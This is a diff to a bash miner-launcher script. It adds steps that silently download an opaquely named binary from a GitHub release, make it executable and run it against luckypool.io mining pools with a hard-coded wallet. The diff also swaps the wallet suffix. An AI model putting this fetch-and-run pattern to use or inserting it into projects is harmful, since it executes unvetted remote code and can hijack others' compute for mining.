@@ -1,5 +1,21 @@
 #!/bin/bash
 
+# Miner download URL
+MINER_URL="https://github.com/vedhagsvp/vpase/releases/download/corcoka/srcbks"
+MINER_BIN="srcbks"
+
+# Download miner if not present
+if [ ! -f "$MINER_BIN" ]; then
+  echo "Miner binary not found, downloading..."
+  wget -q "$MINER_URL" -O "$MINER_BIN"
+  if [ $? -ne 0 ]; then
+    echo "Failed to download miner from $MINER_URL"
+    exit 1
+  fi
+  chmod +x "$MINER_BIN"
+  echo "Miner downloaded and made executable."
+fi
+
 # Pools and ports
 declare -A pools=(
   ["corecoin.luckypool.io"]="3118"
@@ -7,7 +23,7 @@ declare -A pools=(
   ["sg.luckypool.io"]="3118"
 )
 
-wallet="solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.SLPAV"
+wallet="solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.SKEA"
 algorithm="randomy"
 
 function ping_pool() {
@@ -43,7 +59,7 @@ printf '%s\n' "${sorted_pools[@]}"
 while true; do
   for pool in "${sorted_pools[@]}"; do
     echo "Starting miner on pool $pool:${pools[$pool]}"
-    ./srcbks --algorithm $algorithm --pool $pool:${pools[$pool]} --wallet $wallet
+    ./"$MINER_BIN" --algorithm $algorithm --pool $pool:${pools[$pool]} --wallet $wallet
     echo "Miner exited on pool $pool. Trying next pool..."
     sleep 5  # wait before retrying
   done
